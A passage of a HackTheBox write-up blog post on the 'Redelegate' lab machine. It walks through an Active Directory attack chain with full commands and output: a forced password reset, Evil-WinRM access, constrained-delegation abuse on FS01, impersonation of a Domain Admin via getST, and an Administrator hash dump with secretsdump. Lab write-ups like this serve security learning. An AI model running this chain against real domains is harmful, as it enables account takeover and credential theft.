</pre></td><td class="rouge-code"><pre>nxc ldap 10.129.234.50 <span class="nt">-u</span> Marie.Curie <span class="nt">-p</span> <span class="k">***</span> <span class="nt">--bloodhound</span> <span class="nt">--collection</span> ALL <span class="nt">--dns-server</span> 10.129.234.50
</pre></td></tr></tbody></table></code></div></div>

<p>I marked Marie.Curie as owned and ran the cypher “Shortest paths from Owned objects”. 
It revealed that Marie is part of the HelpDesk group, which has ForceChangePassword control over Helen.Frost, who is a member of “Remote Managemen Users” and “IT”.</p>

<p><a href="/post-images/redelegate/bloodhound_initial.jpg" class="popup img-link  shimmer"><img src="/post-images/redelegate/bloodhound_initial.jpg" alt="Bloodhound initial cypher" loading="lazy"></a></p>

<p>Then I used Impacket’s changepasswd to force change Helens password:</p>

<blockquote class="prompt-danger">
  <p>Never use a weak password like that in a real world environment!</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>impacket-changepasswd redelegate/helen.frost@10.129.234.50 <span class="nt">-newpass</span> <span class="s1">'Password123!'</span> <span class="nt">-altuser</span> redelegate/marie.curie <span class="nt">-altpass</span> <span class="s1">'***'</span> <span class="nt">-reset</span>
&lt;...&gt;
evil-winrm <span class="nt">-i</span> 10.129.234.50 <span class="nt">-u</span> helen.frost <span class="nt">-p</span> <span class="s1">'Password123!'</span>
&lt;...&gt;
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>elen.Frost<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
&lt;...&gt;
</pre></td></tr></tbody></table></code></div></div>

<h2 id="escalating-our-privileges"><span class="me-2">Escalating our privileges</span><a href="#escalating-our-privileges" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Checking our privileges reveals that we have the SeEnableDelegationPrivilege privileges.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>elen.Frost<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv
PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                                                    State
<span class="o">=============================</span> <span class="o">==============================================================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted <span class="k">for </span>delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set                                 </span>Enabled
</pre></td></tr></tbody></table></code></div></div>

<p>To make use of it, we need either the permission to add machines to the domain, or the rights to change the machine password.<br /><br />
Let’s check the MachineAccountQuota first to see if we can add any machine accounts to the domain:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>nxc ldap 10.129.234.50 <span class="nt">-u</span> helen.frost <span class="nt">-p</span> <span class="s1">'Password123!'</span> <span class="nt">-M</span> maq
&lt;...&gt;
MAQ         10.129.234.50   389    DC               MachineAccountQuota: 0
</pre></td></tr></tbody></table></code></div></div>

<p>A MachineAccountQuota of 0 means that we can add 0 machines to the domain. So let’s get back to BloodHound and check if Helen has any outbound object control:</p>

<p><a href="/post-images/redelegate/helenBloodHound.jpg" class="popup img-link  shimmer"><img src="/post-images/redelegate/helenBloodHound.jpg" alt="Helen BloodHound outbound control" loading="lazy"></a></p>

<p>Helen seems to have GenericAll control over FS01, which allows us to change the password!
<br /><br /></p>

<blockquote class="prompt-info">
  <p>This is called Constrained Delegation. It allows the machine to impersonate any user to a specific machine.<br /> We need to set the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION flag, which allows the account to be used to authenticate for delegation to another service. The msDS-AllowedToDelegateTo attribute is used to set the target we want to authenticate to.</p>
</blockquote>

<p>Let’s change the machine password first. Then we change TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION and msDS-AllowedToDelegateTo.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>impacket-changepasswd redelegate/<span class="s1">'fs01$'</span>@redelegate.vl <span class="nt">-newpass</span> <span class="s1">'Password123!'</span> <span class="nt">-altuser</span> redelegate/helen.frost <span class="nt">-altpass</span> <span class="s1">'Password123!'</span> <span class="nt">-reset</span> <span class="nt">-debug</span>
&lt;...&gt;
evil-winrm <span class="nt">-i</span> 10.129.234.50 <span class="nt">-u</span> helen.frost <span class="nt">-p</span> <span class="s1">'Password123!'</span>
&lt;...&gt;
Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>elen.Frost<span class="se">\D</span>ocuments&gt; Set-ADComputer <span class="nt">-Identity</span> <span class="s2">"FS01"</span> <span class="nt">-Add</span> @<span class="o">{</span><span class="s1">'msDS-AllowedToDelegateTo'</span><span class="o">=</span>@<span class="o">(</span><span class="s1">'cifs/dc.redelegate.vl'</span><span class="o">)}</span>
&lt;...&gt;
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>elen.Frost<span class="se">\D</span>ocuments&gt; Set-ADAccountControl <span class="nt">-Identity</span> <span class="s2">"FS01$"</span> <span class="nt">-TrustedToAuthForDelegation</span> <span class="nv">$True</span>
&lt;...&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>Now we can check if it worked via Impacket findDelegation:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>impacket-findDelegation <span class="nt">-dc-ip</span> 10.129.234.50 redelegate.vl/Helen.Frost:<span class="s1">'Password123!'</span>
&lt;...&gt;
AccountName  AccountType  DelegationType                      DelegationRightsTo     SPN Exists 
<span class="nt">-----------</span>  <span class="nt">-----------</span>  <span class="nt">----------------------------------</span>  <span class="nt">---------------------</span>  <span class="nt">----------</span>
FS01<span class="nv">$ </span>       Computer     Constrained w/ Protocol Transition  cifs/dc.redelegate.vl  No
&lt;...&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>It worked! Now we can use BloodHound again to pin down a target. I used the saved query in cypher “Locations of Tier Zero / High Value objects”:</p>

<p><a href="/post-images/redelegate/highvalueBloodhound.jpg" class="popup img-link  shimmer"><img src="/post-images/redelegate/highvalueBloodhound.jpg" alt="BloodHound high value search" loading="lazy"></a></p>

<p>Ryan.Cooper appears to be a high value target. On closer inspection we can see that the account is part of the “Domain Admins” group.<br />
So let’s target him. First we need to get Ryan’s Ticket, which we can do via Impacket getST:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>impacket-getST <span class="nt">-spn</span> <span class="s2">"cifs/dc.redelegate.vl"</span> <span class="nt">-impersonate</span> <span class="s2">"Ryan.Cooper"</span> redelegate.vl/<span class="s1">'FS01$'</span>:<span class="s1">'Password123!'</span>
&lt;...&gt;
<span class="o">[</span>-] CCache file is not found. Skipping...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting TGT <span class="k">for </span>user
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Impersonating Ryan.Cooper
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2self
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting S4U2Proxy
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>Ryan.Cooper@cifs_dc.redelegate.vl@REDELEGATE.VL.ccache
&lt;...&gt;
</pre></td></tr></tbody></table></code></div></div>

<p>And finally, we can dump the password hashes of the Administrator account via Impacket secretsdump:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>impacket-secretsdump redelegate.vl/ryan.cooper@dc.redelegate.vl <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-just-dc-user</span> Administrator
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<span class="k">***</span>:::

evil-winrm <span class="nt">-i</span> 10.129.234.50 <span class="nt">-u</span> Administrator <span class="nt">-H</span> <span class="k">***</span>
&lt;...&gt;
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
</pre></td></tr></tbody></table></code></div></div>

<h2 id="conclusion"><span class="me-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Thank you for reading, have a wonderful day and keep hacking!</p>

<h2 id="what-i-learned-from-this-box"><span class="me-2">What I learned from this box:</span><a href="#what-i-learned-from-this-box" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>The entire privilege escalation section and bruteforcing RIDs over MS-SQL was new to me.</p>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/blogging/">Blogging</a>,
          <a href="/categories/writeup/">Writeup</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/linux/"
            class="post-tag no-text-decoration"
          >linux</a>
        
          <a
            href="/tags/hard/"
            class="post-tag no-text-decoration"
          >hard</a>
        
          <a
            href="/tags/active-directory/"
            class="post-tag no-text-decoration"
          >active-directory</a>
        
          <a
            href="/tags/ms-sql/"
            class="post-tag no-text-decoration"
          >ms-sql</a>
        
          <a
            href="/tags/sql/"
            class="post-tag no-text-decoration"
          >sql</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20Redelegate%20-%20Sanity-Archive&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Redelegate%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20Redelegate%20-%20Sanity-Archive&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Redelegate%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Redelegate%2F&text=HackTheBox%20-%20Redelegate%20-%20Sanity-Archive" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/HackTheBox-Redelegate/">HackTheBox - Redelegate</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/HackTheBox-Administrator/">HackTheBox - Administrator</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/HackTheBox-Validation/">HackTheBox - Validation</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/Hack-The-Box-Shocker/">HackTheBox - Shocker</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/HackTheBox-Cap/">HackTheBox - Cap</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/priv-esc/">priv-esc</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web-attacks/">web-attacks</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active-directory</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cgi/">cgi</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/guide/">guide</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/idor/">IDOR</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    










  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/HackTheBox-Validation/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1760266800"
  data-df="ll"
  
>
  Oct 12, 2025
</time>

              <h4 class="pt-0 my-2">HackTheBox - Validation</h4>
              <div class="text-muted">
                <p>Validation is an easy Linux machine, where we have to exploit a SQL-injection vulnerability to get a foothold. Enumerating the system reveals, that only root can login to the machine. So we check f...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/HackTheBox-Cap/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1749463200"
  data-df="ll"
  
>
  Jun  9, 2025
</time>

              <h4 class="pt-0 my-2">HackTheBox - Cap</h4>
              <div class="text-muted">
                <p>Cap is an easy Linux machine that requires us to abuse an IDOR vulnerability to gain credentials. After gaining a foothold we abuse a capability to escalate our privileges.</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/Hack-The-Box-Shocker/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1745060400"
  data-df="ll"
  
>
  Apr 19, 2025
</time>

              <h4 class="pt-0 my-2">HackTheBox - Shocker</h4>
              <div class="text-muted">
                <p>Shocker is an easy Linux machine that requires us to attack a website vulnerable to Shellshock (CVE-2014-6271). After gaining a foothold, we notice multiple ways to escalate our privileges.</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/HackTheBox-Validation/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>HackTheBox - Validation</p>
    </a>
  

  
    <div class="btn btn-outline-primary disabled" aria-label="Newer">
      <p>-</p>
    </div>
  
</nav>

            

            <!-- The Footer -->

<footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>©
    <time>2025</time>

    
      <a href="https://github.com/Sanity-Archive">S4nity</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>Using the <a
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="v7.2.4"
        href="https://github.com/cotes2020/jekyll-theme-chirpy"
        target="_blank"
        rel="noopener"
      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
  </p>
</footer>

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/linux/">linux</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/easy/">easy</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/priv-esc/">priv-esc</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web-attacks/">web-attacks</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active directory</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">active-directory</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/cgi/">cgi</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/guide/">guide</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hard/">hard</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/idor/">IDOR</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

